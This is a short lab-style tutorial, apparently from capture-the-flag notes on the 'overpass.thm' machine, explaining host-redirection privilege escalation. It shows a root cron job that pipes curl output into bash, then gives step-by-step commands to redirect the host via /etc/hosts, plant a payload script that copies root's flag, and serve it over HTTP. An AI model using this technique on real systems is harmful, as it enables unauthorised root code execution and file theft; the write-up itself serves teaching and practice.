# Host Redirection Privilege Escalation

## What is HRPE 

If you encounter a situation where there's a script, or other system process that is calling an external web address, e.g. this crontab example:

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

And also have control over the /etc/hosts file, you can set that domain to be your attacking machine, so instead of going directly to the web and getting the address specified. The file is pulled from your machine.

## How does this work

The /etc/hosts file controls the local resolution of IP addresses and web addresses. If we control that, we can set the overpass.thm url to our IP, for example:

## Exploiting HRPE

1. We would set our /etc/hosts file to include:

	(Attacker IP)	(URL to exploit)
	10.8.7.69	overpass.thm

2. Then, on our attacker machine, we would mirror the directory structure required by the request, e.g.

	cd /tmp
	mkdir downloads
	mkdir downloads/src/
	echo "cp /root/root.txt /tmp" > downloads/src/buildscript.sh

3. Finally, we would bring up an http server

	cd ../../
	sudo python -m http.server 80
